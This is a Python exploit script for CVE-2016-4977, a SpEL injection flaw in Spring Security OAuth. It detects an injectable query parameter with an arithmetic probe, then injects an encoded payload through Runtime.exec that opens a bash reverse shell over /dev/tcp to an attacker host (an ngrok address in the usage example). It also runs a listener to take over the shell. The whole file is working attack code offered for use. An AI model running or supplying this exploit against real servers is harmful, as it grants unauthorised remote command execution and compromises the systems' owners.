# Remote Code Execution

# Regex version:
# ^(2\.0(\.[0-9])?|1\.0(\.[0-5])?)$

import requests
import argparse
import socket
import select
import threading
import subprocess
import urllib.parse
import base64
import copy
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, unquote



def vulnerable_check(url, header):
    try:
        parsed_url = urlparse(url)
        parsed_query = parsed_url.query
        list_query = parse_qs(parsed_query)

        for key in list_query:
            copy_list_query = copy.deepcopy(list_query)
            copy_list_query[key] = "$%7b33333%2B33333%7d"
            injected_querys = urlencode(copy_list_query, doseq=True)
            decoded_querys = unquote(injected_querys)

            encoded_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                injected_querys,
                parsed_url.fragment
            ))
            injected_url = unquote(encoded_url)

            cmd = ["curl", f"{injected_url}", "-H", f"{header}", "-sk"]
            try:
                output = subprocess.run(cmd, capture_output=True, text=True, check=True)
                if "66666" in output.stdout:
                    print("[+] Detected Vulnerability : True\n")
                    return list_query[key]
            except subprocess.CalledProcessError as e:
                print(f"[!] Error during payload injection: {e}")
            except Exception as e:
                print(f"[!] Unexpected error during payload injection: {e}")

        print("[-] Detected Vulnerability : False\n")
    except Exception as e:
        print(f"[!] Vulnerability check failed: {e}")
        return None

# Third encoding of payload 
def generate_attack_payload(shell_payload):
    poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(shell_payload[0])

    for ch in shell_payload[1:]:
        poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 

    poc += ')%7d'
    poc = poc.replace("{", "%7b")
    
    return poc

# First and second encoding of payload
def encoding_attack_payload(lhost, lport):
    try:
        base_payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        bytes_data = base_payload.encode('utf-8')
        encoded_data = base64.b64encode(bytes_data)
        encoded_payload = encoded_data.decode('utf-8')

        shell_payload = f"bash -c {{echo,{encoded_payload}}}|{{base64,-d}}|{{bash,-i}}"
        final_payload = generate_attack_payload(shell_payload)

        if final_payload is None:
            raise ValueError("[!] Payload generation failed.")
        return final_payload
    except Exception as e:
        print(f"[!] Error during payload encoding: {e}")
        return None
    
        
        
# Start server listening for reverse shell script
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("[+] Receive Shell Success!!")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()   


parser = argparse.ArgumentParser(usage="""CVE-2016-4977.py -u http://localhost:8080/oauth/authorize?response_type=token&client_id=acme&scope=openid&redirect_uri=http://test -lh 0.tcp.jp.ngrok.io -lp 17306 -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()

# Parsing url
parsed_url = urlparse(args.URL)
parsed_query = parsed_url.query
list_query = parse_qs(parsed_query)


header = "Authorization: Basic YWRtaW46YWRtaW4="

try:
    vulnerable_param = vulnerable_check(args.URL, header)

    # Exploit
    if vulnerable_param and args.lhost and args.lport and args.fport:
        print("[+] Generating reverse shell payload....")
        attack_payload = encoding_attack_payload(args.lhost, args.lport)
        if attack_payload is None:
            raise ValueError("[!] Attack payload generation failed.")

        print("[+] Injecting reverse shell payload to vulnerable parameter....")
        for i, (key, value_list) in enumerate(list_query.items()):
            for j, value in enumerate(value_list):
                if value == vulnerable_param[0]:
                    list_query[key][j] = attack_payload

        injected_querys = urlencode(list_query, doseq=True)

        encoded_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            injected_querys,
            parsed_url.fragment
        ))

        injected_url = unquote(encoded_url)

        print("[+] Server Listening start.....")
        listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
        listen_thread.start()

        print("[+] Sending reverse shell payload....")
        cmd = ["curl", f"{injected_url}", "-H", f"{header}", "-sk"]
        subprocess.run(cmd, capture_output=True, text=True, check=True)
    else:
        print("[!] Some conditions are needed for exploit")
except Exception as e:
    print(f"[!] Critical error: {e}")